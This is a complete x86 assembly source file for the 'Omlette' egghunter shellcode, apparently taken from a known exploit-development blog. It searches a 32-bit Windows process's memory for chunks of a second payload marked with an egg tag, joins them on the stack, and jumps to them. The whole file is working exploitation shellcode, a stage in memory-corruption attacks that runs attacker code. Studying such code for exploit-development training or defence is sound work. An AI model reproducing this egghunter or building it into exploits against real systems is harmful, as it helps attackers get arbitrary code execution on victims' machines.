; Omlette egghunter shellcode
; You'll probably want to go here to see how to use this: http://www.thegreycorner.com/2013/10/omlette-egghunter-shellcode.html

[BITS 32]

begin:
    MOV EBP, ESP        ; Get stack pointer into EBP to provide starting offset for location to write shellcode
loop_inc_page:
    OR BX, 0x0fff       ; Add PAGE_SIZE-1 to EBX
loop_inc_one:
    INC EBX             ; Increment memory pointer EBX+1
syscall_access:
    XOR EAX, EAX        ; Zero EAX
    MOV AL, 0x02        ; Set EAX for syscall NtAccessCheckAndAuditAlarm
    MOV EDX, EBX        ; Set EDX to memory location for syscall. The syscall clobbers EDX so we cant use it for persistent address storage
    INT 0x2e            ; Perform the syscall
    CMP AL, 0x05        ; Checking for 0xc0000005 (ACCESS_VIOLATION)
    JE loop_inc_page    ; Invalid memory, go to next memory page
check_marker:
    MOV EAX, 0x78563412 ; Put egg marker in EAX
    MOV EDI, EBX        ; Set EDI to the valid memory location from EBX
    SCASD               ; Compare the dword in [EDI] to marker in EAX, increment EDI+4
    JNZ loop_inc_one    ; No match? Back to searching loop
    SCASD               ; Compare the dword in [EDI] to EAX again, increment EDI+4
    JNZ loop_inc_one    ; No match? Back to searching loop
copy_egg_chunk:
    MOV ESI, EDI        ; Move memory location of start of egg data to ESI
    MOV EDI, EBP        ; Move memory location to write egg to EDI
    LODSW               ; Move word of memory from [ESI] into EAX, increment ESI+2. AH has chunk size, AL has flag value.
    XOR ECX, ECX        ; Zero ECX
    MOV CL, AH          ; Copy AH (egg chunk size) to CL to use as counter for REP MOVSB operation
    CMP AL, 0x01        ; Compare flag value in AL to 1 to see if we have written final egg chunk
    REP MOVSB           ; Copy ECX number of bytes from [ESI] to [EDI]. Increments EDI and ESI by ECX
    MOV EBP, EDI        ; EBP stores address of end of written shellcode
    JNE loop_inc_one    ; Jump back to searching loop if we have not written final egg chunk
    JMP ESP             ; Jump to start of completed egg


